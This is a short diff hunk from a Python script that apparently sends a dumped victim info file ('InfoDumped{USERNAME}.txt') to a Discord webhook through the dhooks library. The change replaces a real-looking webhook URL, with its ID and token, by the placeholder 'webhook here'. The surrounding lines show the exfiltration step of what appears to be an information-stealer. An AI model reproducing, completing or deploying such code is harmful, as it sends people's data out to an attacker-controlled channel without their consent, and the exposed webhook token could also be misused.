@@ -82,7 +82,7 @@ from dhooks import Webhook, File
 from io import BytesIO
 import requests
 
-hook = Webhook('https://discord.com/api/webhooks/854685703039614996/3B_vYm9Lu4kWg1Pj_UVvRrzcjSWBUY717GfFMT9draQekj1k63Y37kImx2CJYTO4dAOH')
+hook = Webhook('webhook here')
 
 file = File(f'{dir_path}\InfoDumped{USERNAME}.txt', name=f'InfoDumped{USERNAME}.txt')
 
